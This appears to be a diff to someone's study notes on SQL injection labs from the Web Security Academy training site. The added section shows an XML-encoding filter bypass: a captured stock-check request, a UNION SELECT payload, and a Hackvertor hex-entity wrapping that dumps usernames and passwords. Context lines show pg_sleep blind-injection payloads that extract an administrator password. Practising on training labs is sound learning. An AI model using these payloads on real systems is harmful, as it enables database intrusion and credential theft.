@@ -995,9 +995,50 @@ vHvNvopdDIu9EmGO'; Select case when (username ='administrator' AND length(passwo
 
 vHvNvopdDIu9EmGO'; Select case when (username ='administrator' AND SUBSTR(password,1,1)='a') Then pg_sleep(3) Else pg_sleep(0) End from users--
 __________________________________________________________________________________________________________________________________________________________________
+SQL injection with filter bypass via XML encoding
+----------------------------------------------------
+That injection is in check stock tab
 
+POST /product/stock HTTP/2
+Host: 0a6d005304b321db80ba3a5e000c003e.web-security-academy.net
+Cookie: session=pJdhX5qbP3DmgPsRWvrSBDdWoz5t82Jo
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a6d005304b321db80ba3a5e000c003e.web-security-academy.net/product?productId=5
+Content-Type: application/xml
+Content-Length: 194
+Origin: https://0a6d005304b321db80ba3a5e000c003e.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=1
+Te: trailers
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>
+	5
+</productId>
+<storeId>
+	1
+</storeId>
+</stockCheck>
 
+We have to injecti in this place
 
+<storeId>
+	1 Union Select Null--
+</storeId>
 
+But it cannot, we have to install hackvetor extension in burpsuite.
+Hackvertor is a tag-based conversion tool that supports various escapes and encodings including HTML5 entities, hex, octal, unicode, url encoding etc.
 
+I use hex_entities tag 
 
+<storeId>
+<@/hex_entities>
+	1 Union Select username|| '~' || password from users --
+<@/hex_entities>
+</storeId>
+</stockCheck>
+__________________________________________________________________________________________________________________________________________________________________
